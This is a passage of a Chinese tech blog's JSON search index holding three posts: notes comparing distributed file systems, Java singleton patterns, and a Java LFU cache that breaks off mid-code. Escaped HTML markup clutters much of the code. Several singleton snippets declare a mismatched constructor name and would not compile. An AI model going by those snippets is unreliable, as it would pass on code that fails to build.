      "content": "分布式文件存储阶段小结 一. 分类 块存储 SAN，DAS， 网盘，EBS 块存储读写快，不利于共享 文件存储 NAS（NFS，CIFS） 文件存储读写慢，利于共享 对象存储 S3，OSS， TFS， HDFS 兼顾块存储和文件存储的优点 二. 基本概念 volume fuse posix 机架感知 存储自动rebalance 扩容/缩容 去重 元数据管理 中心化与去中心化 Erase Code（EC） 三. 主流DFS比较 NAS 使用简单，共享方便。但是支持的文件数有限制，备份/HA/跨机房双活运维成本高。系统层面的rsync增量备份延迟不是很可控，crontab job设置不合理时会给NAS服务器造成严重的性能问题。总的来说，应用层面控制能力不强。 TFS Taobao自研并验证过小文件存储系统，借鉴了业内文件存储的先进的思想。支持的文件量大，扩容/缩容方便，完整的集群，HA，跨机房双活方案。缺点是社区缺乏支持，除非使用方吃透代码自己演进代码分支，否则开发，运维会变得不可控。据说淘宝OSS也没有继续采用TFS。 实际使用过程中nginx，meta server组件出问题比较多。2.2.16分支中block 迁移工具错误比较多，集群间文件迁移需要特别注意。 HDFS apache开源的大文件存储方案。适合离线批处理系统，是hbase，hadoop的基础。社区支持好，特性丰富。 fastDFS 架构简单，但是不能直接支持自定义文件路径。据说稳定性待验证。 GlusterFS 提供类似于NAS，raid的网络存储方案。采用弹性hash算法路由具体存储(去中心)。性能待验证。 Ceph 提供了RBD(Ceph Block Device)，CephFS(Ceph File System), RGW(RADOS GateWay)存储功能。功能丰富，重量级，有待生产验证。 MooseFS MogileFS perl based FS GridFS mongoDB based FS OpenStack Cinder/Swift Cinder, openstack 块存储服务 Swift， openstack 对象存储服务 Facebook Haystack ",
      "url"      : "http://localhost:4000/2018/06/16/DFS/"
    } ,
  
    {
      "title"    : "设计模式 - 单例",
      "category" : "设计模式",
      "content": "单例实现方式 单例1 public class DraconianSingleton {  private static DraconianSingleton instance;  public static synchronized DraconianSingleton getInstance() {  if (instance == null) {   instance = new DraconianSingleton();  }  return instance;  } &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DraconianSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 单例2 static volatile 的instance (layz init with double check) 多线程环境下，double check考虑 (synchronized class类，非实例) double check模式中volatile的原因是避免指令排序 分布对象的内存空间 初始化对象 设置instance对象指向内存空间 public class DclSingleton {  private static volatile DclSingleton instance;  public static DclSingleton getInstance() {  if (instance == null) {   synchronized (DclSingleton.class) {    if (instance == null) {    instance = new DclSingleton();    }   }  }  return instance;  } &lt;span class=&quot;c1&quot;&gt;// private constructor and other methods...&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DraconianSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 单例3 static final 的instance域 (eager init) public class EarlyInitSingleton {  private static final EarlyInitSingleton INSTANCE = new EarlyInitSingleton();  public static EarlyInitSingleton getInstance() {  return INSTANCE;  } &lt;span class=&quot;c1&quot;&gt;// private constructor and other methods...&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DraconianSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 单例4 public class InitOnDemandSingleton {  private static class InstanceHolder {  private static final InitOnDemandSingleton INSTANCE = new InitOnDemandSingleton();  }  public static InitOnDemandSingleton getInstance() {  return InstanceHolder.INSTANCE;  } &lt;span class=&quot;c1&quot;&gt;// private constructor and other methods...&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DraconianSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 单例5 public enum EnumSingleton {  INSTANCE; &lt;span class=&quot;c1&quot;&gt;// other methods...&lt;/span&gt; } 注意事项 私有的构造函数 单例类如果实现了Serializable接口（直接或者间接），需要添加一个readResolve()方法，用instance域替换掉Serialization机制自动生成的实例类对象 private Object readResolve(){  return instance; } 参考 baeldung ",
      "url"      : "http://localhost:4000/2018/06/16/design-pattern-singleton/"
    } ,
  
    {
      "title"    : "show me the code - LFU/LRU Java实现",
      "category" : "algorithm",
      "content": "show me the code - LFU/LRU Java LFU /** * Created by kangkaisen on 16/5/4. * 关键点： * 1. 通过一个hashmap记录每个key访问情况 * 2. key访问情况可用用HitRate * 3. HitRate中除了记录访问次数，还要key对象，用于反向索引查询key，清理hashmap * 4. HitRate中lastTime用于访问次数相同时的比较 */ import java.util.*; public class LFUCache { private static final int DEFAULT_MAX_SIZE = 3; private int capacity = DEFAULT_MAX_SIZE; //保存缓存的访问频率和时间 private final Map&lt;Integer, HitRate&gt; cache = new HashMap&lt;Integer, HitRate&gt;(); //保存缓存的KV private final Map&lt;Integer, Integer&gt; KV = new HashMap&lt;Integer, Integer&gt;(); &lt;span class=&quot;c1&quot;&gt;// @param capacity, an integer&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;LFUCache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capacity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;capacity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capacity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @param key, an integer&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @param value, an integer&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @return nothing&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;KV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capacity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getKickedKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;no&quot;&gt;KV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HitRate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nanoTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//若是key相同只增加频率,更新时间,并不进行置换&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;HitRate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hitRate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;hitRate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hitCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;hitRate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nanoTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;no&quot;&gt;KV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;KV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;HitRate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hitRate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;hitRate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hitCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;hitRate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nanoTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @return 要被置换的key&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getKickedKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;HitRate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Collections&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HitRate&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Comparable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HitRate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hitCount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 命中次数&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lastTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 上次命中时间&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HitRate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hitCount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lastTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hitCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hitCount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lastTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HitRate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hitCount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hitCount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lastTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;LFUCache&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LFUCache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span 